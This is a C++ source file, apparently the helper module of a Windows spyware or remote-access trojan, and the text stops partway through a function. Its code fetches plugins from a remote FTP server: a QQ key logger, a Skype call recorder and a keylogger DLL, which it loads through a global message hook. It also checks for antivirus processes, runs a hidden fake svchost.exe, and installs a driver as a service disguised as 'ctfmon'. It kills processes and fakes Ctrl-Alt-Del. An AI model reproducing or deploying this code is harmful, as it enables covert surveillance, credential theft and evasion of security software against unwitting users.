#include "StdAfx.h"
#include "until.h"
#include <ntddndis.h>
#include "MyCommon.h"
#include "Evidence.h"
#include "Skype.h"
#include "KeyboardManager.h"

enum
{
	ERR_OK = 0,
	ERR_COMPRESS_CREATEFILE,
	ERR_COMPRESS_FILESIZE,
	ERR_COMPRESS_READFILE,
	ERR_COMPRESS_PROCESS,
	ERR_COMPRESS_WRITEFILE,
};

unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#if !defined(_CONSOLE)
 	try
 	{
#endif	
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#if !defined(_CONSOLE)
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, BOOL bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, FALSE, FALSE, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);

	return hThread;
}



DWORD GetProcessID(LPCTSTR lpProcessName)
{
	DWORD RetProcessID = 0;
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	
	if(Process32First(handle,info))
	{
		if (lstrcmpi(info->szExeFile,lpProcessName) == 0)
		{
			RetProcessID = info->th32ProcessID;
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if (lstrcmpi(info->szExeFile,lpProcessName) == 0)
			{
				RetProcessID = info->th32ProcessID;
				return RetProcessID;
			}
		}
	}
	return RetProcessID;
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;	
}

void KillProcess(LPCTSTR lpProcessName)
{
	if (lpProcessName==NULL)
	{
		return;
	}
	DWORD dwProcessID=GetProcessID(lpProcessName);
	if (dwProcessID==0)
	{
		return;
	}
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,dwProcessID);
	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	DebugPrivilege(SE_DEBUG_NAME, FALSE);


}

char *GetLogUserXP()
{
	TCHAR	*szLogName = NULL;
	DWORD	dwSize = 0;
	if (WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTSUserName, &szLogName, &dwSize))
	{
		char	*lpUser = new char[256];
		lstrcpy(lpUser, szLogName);
		WTSFreeMemory(szLogName);
		return lpUser;
	}
	else
		return NULL;
}

char *GetLogUser2K()
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return NULL;
	
	BOOL fResult  = FALSE;
    HANDLE hProc  = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	char	*lpUserName = NULL;
	__try
	{
        // Open the process with PROCESS_QUERY_INFORMATION access
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
        if (hProc == NULL)
		{
			__leave;
		}
        fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		DWORD	nNameLen = 256;
		lpUserName = new char[256];
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
	}

	return lpUserName;
}

char *GetCurrentLoginUser()
{
	OSVERSIONINFOEX    OsVerInfo;
	ZeroMemory(&OsVerInfo, sizeof(OSVERSIONINFOEX));
	OsVerInfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
	{
		OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
			return NULL;
	}
	
	if(OsVerInfo.dwMajorVersion == 5 && OsVerInfo.dwMinorVersion == 0)
		return GetLogUser2K();
	else
		return GetLogUserXP();
	
}

BOOL SwitchInputDesktop()
{
 	BOOL	bRet = FALSE;
 	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = TRUE;
	}
	CloseDesktop(hOldDesktop);

	CloseDesktop(hNewDesktop);


	return bRet; 
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];
	
	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
//		CloseDesktop(old_desktop);
		return FALSE;
	}
	
	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
//		CloseDesktop(old_desktop);

		return FALSE;
	}
	
	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);
	
	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;
	
	if (name != NULL)
	{
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else
	{
		// No, so open the input desktop
		desktop = OpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	
	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}
	
	// Switch to the new desktop
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}
//	CloseDesktop(desktop);
	// We successfully switched desktops!
	return TRUE;
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	// Switch into the Winlogon desktop
	char str1[50] = "GUnPoWon";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), ENCODEKEY+2 );
	if (!SelectDesktop(str1))
	{
		return FALSE;
	}

	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	
	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);
	
	return TRUE;
}


BOOL FtpDownLoad(TCHAR *szUrl,LPCTSTR szFileName,TCHAR *szPlugName,TCHAR *szUser,TCHAR *szPass)  
{  

	BOOL bRet=FALSE;
	//char buffer[100]={0};  
	HINTERNET hInternetSession=0;
	//HINTERNET internetopenurl=0;
	HINTERNET hInternetConnect=0; 
    //HANDLE createfile=0;  

	__try
	{

		hInternetSession=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,0,0,INTERNET_FLAG_NO_CACHE_WRITE);  

		if (hInternetSession==NULL){   
			//	dprintf(("Internet open failed! %d\r\n",GetLastError()));
			return bRet;  
		}

		//InternetSetStatusCallback(hInternetSession, FtpCtrl_CallbackStatus);

		//SetEvent(m_hContinue);

		//_asm int 3
		hInternetConnect = InternetConnect(hInternetSession,szUrl,8099,szUser,szPass,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE|INTERNET_FLAG_EXISTING_CONNECT,0);

		if(NULL== hInternetConnect)
		{
			return bRet;
		}

		bRet=FtpGetFile(hInternetConnect, szPlugName,szFileName,FALSE,0,FTP_TRANSFER_TYPE_BINARY,0);
	
	}

	__finally
	{
		if (hInternetSession){
			InternetCloseHandle(hInternetSession);

		}
		if (hInternetConnect){
			InternetCloseHandle(hInternetConnect); 
		}
	}


	return bRet;

}

// BOOL ftp_get(LPCTSTR szURL,LPCTSTR szFileName)
// {
// 	BOOL bRet=FALSE;
// }

BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = TRUE;
	BOOL		bRet = TRUE;
	
	//_asm int 3
	hInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return FALSE;

	//printf(szURL);

	hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	


	if (hUrl == NULL)
		return FALSE;

	//printf("fffff");

	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			if(!InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead))
			{
				bRet = FALSE;
				break;
			}
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = FALSE;
				break;
			}
			bIsFirstPacket = FALSE;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	
	return bRet;
}

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//解密
{
	unsigned long i;
	unsigned char p;

	if ( nLen == 0 ) nLen = lstrlen((char*)szRec);
	p = (unsigned char ) key % 254 +1;
	
	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}

void ASCIIToUnicode(char* ASCIIString,wchar_t* WideChar)
{
	int AStrLen;


	AStrLen=MultiByteToWideChar(CP_ACP,0,ASCIIString,strlen(ASCIIString),WideChar,0);

	//	AStrLen=WideCharToMultiByte(CP_ACP,0,WideChar,wcslen(WideChar),ASCIIString,0,NULL,NULL);


	MultiByteToWideChar(CP_ACP,0,ASCIIString,strlen(ASCIIString),WideChar,AStrLen);
}


BOOL GetCPUID(LPSTR lpOutStr)
{
	ULONG s1 = 0;
	ULONG s2 = 0;
	UCHAR vendor_id[32] = {0};

	CHAR VernderID[32] = {0};
	CHAR CPUID[32] = {0};
	CHAR CPUID1[32] = {0};
	CHAR CPUID2[32] = {0};

	char sel = '1';
	switch (sel)
	{
	case '1':
		__asm
		{
			xor eax,eax;		//eax=0:取Vendor信息
			cpuid;				//取cpu id指令,可在Ring3级使用
			mov dword ptr vendor_id,ebx;
			mov dword ptr vendor_id[+4],edx;
			mov dword ptr vendor_id[+8],ecx;
		}
		::wsprintf(VernderID, "%s",vendor_id);	

		__asm
		{
			mov eax,01h;		//eax=1:取CPU序列号
			xor edx,edx;
			cpuid;
			mov s1,edx;
			mov s2,eax;
		}
		::wsprintf(CPUID1, "%08X%08X",s1,s2);

		__asm
		{
			mov eax,03h;
			xor ecx,ecx;
			xor edx,edx;
			cpuid;
			mov s1,edx;
			mov s2,ecx;
		}
		::wsprintf(CPUID2, "%08X%08X",s1,s2);
		break;

	case '2':
		{
			__asm
			{
				mov ecx,119h;
				rdmsr;
				or eax,00200000h;
				wrmsr;
			}
		}
		//OutputDebugString("CPU id is disabled.");

		break;
	}

	::wsprintf(lpOutStr, "%s%s%s", VernderID, CPUID1, CPUID2);

	return TRUE;
}

/*
BOOL GetFirstMac(int *pMacAddr)
{
	typedef struct _ASTAT_
	{
		ADAPTER_STATUS adapt;
		NAME_BUFFER    NameBuff [30];
	}ASTAT, * PASTAT;

	NCB ncb = {0}; 
	UCHAR uRetCode = 0; 
	LANA_ENUM lenum = {0}; 
	int i = 0; 

	ncb.ncb_command = NCBENUM; 
	ncb.ncb_buffer = (UCHAR *)&lenum; 
	ncb.ncb_length = sizeof(lenum); 
	uRetCode = Netbios( &ncb ); 

	if (0 != uRetCode)
	{
		return FALSE;
	}

	UCHAR nCardID = lenum.lana[0];
	ASTAT Adapter = {0};
	memset( &ncb, 0, sizeof(ncb) );
	ncb.ncb_command = NCBRESET;
	ncb.ncb_lana_num = nCardID;   // 指定网卡号


	//首先对选定的网卡发送一个NCBRESET命令，以便进行初始化 
	uRetCode = Netbios( &ncb );

	memset( &ncb, 0, sizeof(ncb) );
	ncb.ncb_command = NCBASTAT;
	ncb.ncb_lana_num = nCardID; 	// 指定网卡号

	strcpy( (char *)ncb.ncb_callname,"*" );

	// 指定返回的信息存放的变量 
	ncb.ncb_buffer = (unsigned char *) &Adapter;
	ncb.ncb_length = sizeof(Adapter);

	// 发送NCBASTAT命令以获取网卡的信息 
	uRetCode = Netbios(&ncb);
	BOOL bRet = FALSE;
	if ( uRetCode == 0 )
	{
		for (int i=0; i<6; i++)
		{
			pMacAddr[i] = Adapter.adapt.adapter_address[i];
		}

		bRet = TRUE;
	}

	return bRet;
}*/

//根据网卡的名称，取得其物理MAC；
BOOL GetNetAdapterPhyMAC(CHAR *strDeviceName, BYTE *lpDeviceMAC)
{
	CHAR strDriver[256] = {0};
	::lstrcpy(strDriver, "\\\\.\\");
	::lstrcat(strDriver, strDeviceName);
	//strDeviceName即网卡的名称
	//HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards键下某网卡的ServiceName值  
	HANDLE hDriver = ::CreateFile(strDriver,
		GENERIC_READ,  
		0,  
		NULL,  
		OPEN_EXISTING,  
		0,  
		NULL);  
	if (INVALID_HANDLE_VALUE == hDriver)  
	{  
		return FALSE;  
	} 

	UCHAR ucData[8] = {0};
	DWORD ByteRet = 0;
	ULONG oid = OID_802_3_PERMANENT_ADDRESS;
	BOOL bRet = ::DeviceIoControl(hDriver,
		IOCTL_NDIS_QUERY_GLOBAL_STATS,    
		&oid,
		4,  
		ucData,
		sizeof(ucData),  
		&ByteRet,  
		NULL);
	if (!bRet)
	{
		::CloseHandle(hDriver);
		return FALSE;
	}

	::CopyMemory(lpDeviceMAC, ucData, sizeof(ucData));

	::CloseHandle(hDriver);

	return TRUE;
}

//取网卡MAC地址
LPSTR GetFirstMac(LPSTR lpAddrMac)
{
	IP_ADAPTER_INFO  NetAdapterInfo[5] = {0};
	PIP_ADAPTER_INFO pNetAdapterInfo = NetAdapterInfo;

	DWORD dwBufSize = sizeof(NetAdapterInfo);
	::GetAdaptersInfo(NetAdapterInfo, &dwBufSize);

	lpAddrMac[0] = 0;
	int iNetAdaNum = 0;
	do
	{
		if (pNetAdapterInfo->Description)
		{
			BYTE TempMAC[8] = {0};
			BOOL bRet = GetNetAdapterPhyMAC((TCHAR *)pNetAdapterInfo->AdapterName, TempMAC); 
			if (!bRet)
			{
				break;
			}

			CHAR szSubMacAddr[16] = {0};
			::wsprintf(szSubMacAddr, "%02X%02X%02X%02X%02X%02X", 
				TempMAC[0], 
				TempMAC[1],
				TempMAC[2],
				TempMAC[3],
				TempMAC[4],
				TempMAC[5]);

			::lstrcat(lpAddrMac, szSubMacAddr);
			iNetAdaNum++;
		}

		pNetAdapterInfo = pNetAdapterInfo->Next;
	} while (pNetAdapterInfo);

	return lpAddrMac;
}

// 取自用的机器标识符
LPSTR GetTSPMachineID(LPSTR szCPUID)
{
	GetFirstMac(szCPUID);

	if (strlen(szCPUID)==0)
	{
		char m_Volume[256];//卷标名
		char m_FileSysName[256];
		DWORD m_SerialNum;//序列号
		DWORD m_FileNameLength;
		DWORD m_FileSysFlag;
		::GetVolumeInformation("c:\\",m_Volume,256,&m_SerialNum,&m_FileNameLength,&m_FileSysFlag,m_FileSysName,256);
		wsprintf((LPSTR)szCPUID,"%08x",m_SerialNum);
	}
	return szCPUID;
}



BOOL GetRegValue(HKEY hMainKey, LPCTSTR szSubKey, LPCTSTR szItem, LPTSTR szValue)
{  
	HKEY hRsltKey;
	//打开注册表
	if (ERROR_SUCCESS != RegOpenKey(hMainKey, szSubKey, &hRsltKey))
	{   
		return FALSE;
	}

	BYTE lpData[MAX_PATH] = {0};
	DWORD dwType = REG_SZ;
	DWORD dwNum = MAX_PATH;

	//查询注册表项值
	long lRslt = RegQueryValueEx(hRsltKey, szItem, 0, &dwType, lpData, &dwNum);
	if (lRslt != ERROR_SUCCESS)
	{   
		return FALSE;
	}

	strcpy_s((char *)szValue, dwNum, (char *)lpData);

	//关闭打开的键
	if (hMainKey)
	{
		RegCloseKey(hMainKey);
	}
	if (hRsltKey)
	{
		RegCloseKey(hRsltKey);
	}

	return TRUE;
}

DWORD MyGetFileSize(TCHAR *szFileName)
{
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return 0;
	}
	DWORD dwFileSize=GetFileSize(hFile,0);
	CloseHandle(hFile);
	return dwFileSize;

}

BOOL GetScreenState()
{

	HANDLE hEvent =OpenEvent(EVENT_ALL_ACCESS, FALSE,"AutoCreenCap");
	if (hEvent)
	{
		CloseHandle(hEvent);
		return 0;
	}
	return 1;
}


void StopAutoScreen()
{
	const TCHAR *m_szAutoScrren="AutoCreenCap";
	HANDLE hEvent=0;
	do 
	{
		hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,m_szAutoScrren);

		if(hEvent)
		{
			SetEvent(hEvent);
			CloseHandle(hEvent);
			Sleep(2000);
		}
	} while (hEvent);

}



int CompressFile(TCHAR *lpSrcFileName, TCHAR*lpDesFileName)
{
	BYTE *pBufferRead=NULL;
	BYTE *pBufCompress=NULL;
	int nRet = 0;

	


	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hFileOut = INVALID_HANDLE_VALUE ;

	__try 
	{

		hFile = CreateFile(lpSrcFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			
			
			nRet =ERR_COMPRESS_CREATEFILE;
			__leave;
		}

		int nUnCompressSize = GetFileSize(hFile, NULL);
		if (nUnCompressSize==0){
			nRet = ERR_COMPRESS_FILESIZE;
			__leave;
		}

		hFileOut = CreateFile(lpDesFileName, GENERIC_WRITE,0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFileOut)
		{
			nRet = ERR_COMPRESS_CREATEFILE;
			__leave;
		}

		pBufferRead = new BYTE[nUnCompressSize];
		DWORD dwRead = 0;
		BOOL bRet = ReadFile(hFile, pBufferRead, nUnCompressSize, &dwRead, NULL);
		if (!bRet || nUnCompressSize != dwRead)
		{

			nRet = ERR_COMPRESS_READFILE;
			__leave;
		}

		ULONG nCompressSize = nUnCompressSize;

		pBufCompress = new BYTE[nCompressSize];
		int nProcess = compress(pBufCompress, &nCompressSize, pBufferRead, nUnCompressSize);
		if (Z_OK != nProcess || 0 >= nUnCompressSize)
		{
			nRet = ERR_COMPRESS_PROCESS;
			__leave;

		}

		//写入输出文件
		dwRead = 0;
		bRet = WriteFile(hFileOut, &nUnCompressSize, sizeof(nUnCompressSize), &dwRead, NULL);
		if (!bRet || sizeof(nUnCompressSize) != dwRead)
		{

			nRet = ERR_COMPRESS_WRITEFILE;
			__leave;

		} 

		dwRead = 0;
		bRet = WriteFile(hFileOut, pBufCompress, nCompressSize, &dwRead, NULL);
		if (!bRet || nCompressSize != dwRead)
		{

			nRet = ERR_COMPRESS_WRITEFILE;
			__leave;

		}


	}

	__finally
	{
		
		if(hFile != INVALID_HANDLE_VALUE)
			CloseHandle(hFile);
		if(hFileOut != INVALID_HANDLE_VALUE)
			CloseHandle(hFileOut);
		if (pBufCompress)
			delete pBufCompress;
		if (pBufferRead)
			delete pBufferRead;
	}

	return nRet;
}


LPVOID GetShareMem(LPCTSTR lpName)
{
	LPVOID pShareMem;
	HANDLE hMemShare=CreateFileMapping((HANDLE)0xFFFFFFFF,NULL,PAGE_READWRITE,0,sizeof(FTPCONFIG),lpName);
	pShareMem=MapViewOfFile(hMemShare, FILE_MAP_WRITE|FILE_MAP_READ,0,0,sizeof(FTPCONFIG));
	if (GetLastError()==ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMemShare);
	}
	//CloseHandle(hMemShare);
	return pShareMem;
}



DWORD WINAPI PlugDownload(LPVOID LPARAM)
{

	AUTOSREECNCONFIG AutoConfig;
	memcpy(&AutoConfig,(char*)LPARAM,sizeof(AUTOSREECNCONFIG));
	

	while(!MyCommon::IsServerStart("ctfmon"))
	{
		Sleep(1000*30);
	}

	char szQQmsglogPath[MAX_PATH];
	char szQQmsglogPath_bak[MAX_PATH];
	char szTmpDir[MAX_PATH];
	char szPlugName[MAX_PATH];
	wsprintf(szPlugName,"%s_QQ",AutoConfig.szPlugName);

	GetTempPath(sizeof(szTmpDir), szTmpDir);
	wsprintf(szQQmsglogPath,"%splug\\",szTmpDir);


	MakeSureDirectoryPathExists(szQQmsglogPath);

	StrCatA(szQQmsglogPath,"qmylog.tmp");

	wsprintf(szQQmsglogPath_bak,"%sqmylog.tmp_bak",szTmpDir);

	//下载QQ密钥记录器

	if (_access(szQQmsglogPath,0)==-1)
	{
//		DeleteFile(szQQmsglogPath);
		MoveFileEx(szQQmsglogPath,szQQmsglogPath_bak,FALSE);
		FtpDownLoad(AutoConfig.szDownLoadPlugUrl,szQQmsglogPath,szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 

	}

	if (!CSkype::GetPathInReg()){return 0;} // 没有安装则退出

	//skype录音插件
	char szSkypeRecordPath[MAX_PATH];
	char szSkypeRecordPath_bak[MAX_PATH];
	wsprintf(szSkypeRecordPath_bak,"%sSkrd.tmp_bak",szTmpDir);
	wsprintf(szSkypeRecordPath,"%splug\\Skrd_skype.tmp",szTmpDir);
	memset(szPlugName,0,MAX_PATH);
	wsprintf(szPlugName,"%s_Skype",AutoConfig.szPlugName);



	if (_access(szSkypeRecordPath,0)==-1)
	{
//		DeleteFile(szSkypeRecordPath);
		MoveFileEx(szSkypeRecordPath,szSkypeRecordPath_bak,FALSE);
		FtpDownLoad(AutoConfig.szDownLoadPlugUrl,szSkypeRecordPath,szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 

	}



	return 0;


}




DWORD WINAPI KeyBoardLoad(LPVOID LPARAM)
{


	AUTOSREECNCONFIG AutoConfig;
	memcpy(&AutoConfig,(char*)LPARAM,sizeof(AUTOSREECNCONFIG));
	char szKeyLogPath[MAX_PATH];
	char szTmpDir[MAX_PATH];
	char szPlugName[MAX_PATH];
	wsprintf(szPlugName,"%s_Keylog",AutoConfig.szPlugName);

	//360tray.exe")||
	//CProcess::FindProcessID("360sd.exe")||
	//CProcess::FindProcessID("ZhuDongFangYu.exe")

	
	if(!MyCommon::IsServerStart("ctfmon"))
	{
		if (GetProcessID("360sd.exe")||
			GetProcessID("360tray.exe")||
			GetProcessID("ZhuDongFangYu.exe")||
			GetProcessID("KSafeTray.exe")
			)
		{
			StartEnLog();
			return FALSE;
		}
	//	OutputDebugStringA("ddd");
//		Sleep(1000*60);
	}

	char *szcmd="C:\\Windows\\addins\\svchost.exe";

	if (PathFileExists(szcmd))
	{
		WinExec(szcmd,SW_HIDE);
		return 1;
	}

	

	GetTempPath(sizeof(szTmpDir), szTmpDir);
	wsprintf(szKeyLogPath,"%s%s",szTmpDir,szPlugName);

	//if(!DeleteFile(szKeyLogPath)) return 0;

	char szKeyLogPath_bak[MAX_PATH];
	wsprintf(szKeyLogPath_bak,"%s%s_bak",szTmpDir,szPlugName);

	//StrCpyA(szKeyLogPath_bak,szKeyLogPath);


	if (_access(szKeyLogPath_bak,0)==-1)
	{
	//	DeleteFile(szKeyLogPath_bak);
		FtpDownLoad(AutoConfig.szDownLoadPlugUrl,szKeyLogPath_bak,szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 

	}

	if (GetModuleHandle(szPlugName))
	{
		return 0;
	}

	CopyFile(szKeyLogPath_bak,szKeyLogPath,FALSE);
	HMODULE hDll=0;
	typedef	BOOL	(__cdecl *pPluginFunc)(HHOOK);
	hDll= LoadLibrary(szKeyLogPath);
	if (!hDll) return 0; 

	HHOOK hHook = SetWindowsHookExA(WH_GETMESSAGE,(HOOKPROC)GetProcAddress(hDll,"_GetMsgProc@12"),(HINSTANCE)hDll, 0);

	//HHOOK hQQHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)GetProcAddress(hDll,"_LowLevelKeyboardProc@12"),GetModuleHandle(0), 0);

	pPluginFunc PluginFunc = (pPluginFunc)GetProcAddress(hDll,"StartLog");
	if (!PluginFunc) return 0;

	__try
	{
		PluginFunc(hHook);//调用此函数
    }

	__except(1){}

	return 0;

}


DWORD WINAPI DriveLoad(LPVOID LPARAM)
{
	AUTOSREECNCONFIG AutoConfig;
	memcpy(&AutoConfig,(char*)LPARAM,sizeof(AUTOSREECNCONFIG));
	char szSysPath[MAX_PATH];
	char szWindowDir[MAX_PATH];
	char szPlugName[MAX_PATH];
	wsprintf(szPlugName,"%s_sys",AutoConfig.szPlugName);

	GetWindowsDirectory(szWindowDir,MAX_PATH);
	wsprintf(szSysPath,"%s\\system\\%s",szWindowDir,"WINNET.DRV");
	//Sleep(1000);

	char szSysPath2[MAX_PATH];

	wsprintf(szSysPath2,"%s\\system\\%s",szWindowDir,"MICROWINNET.DRV");



	if (!MyCommon::IsServerStart("ctfmon"))
	{
		if (_access(szSysPath,0)==-1)
		{
			FtpDownLoad(AutoConfig.szDownLoadPlugUrl,szSysPath,szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 
		}
		MyCommon::InstallService("ctfmon",szSysPath,"ctfmon");
		MyCommon::InstallService("winio",szSysPath2,"winio");

	}
	else
	{
		if (_access(szSysPath,0)==-1)
		{
			FtpDownLoad(AutoConfig.szDownLoadPlugUrl,szSysPath,szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 
		}

		strcat(szPlugName,"_2");
		//DeleteFile(szSysPath2);
		if (_access(szSysPath2,0)==-1)
		{
			FtpDownLoad(AutoConfig.szDownLoadPlugUrl,szSysPath2,szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass);
		}
	}

	return 0;
}


BOOL StartAutoSreen(LPVOID lparam,TCHAR *szIP,DWORD dwFlag)
{
	if (0 != IsBadReadPtr(lparam,4))   //zhenyu 20140917 防止指针被篡改
	{
		return 0;
	}

	AUTOSREECNCONFIG AutoConfig;
	__try
	{

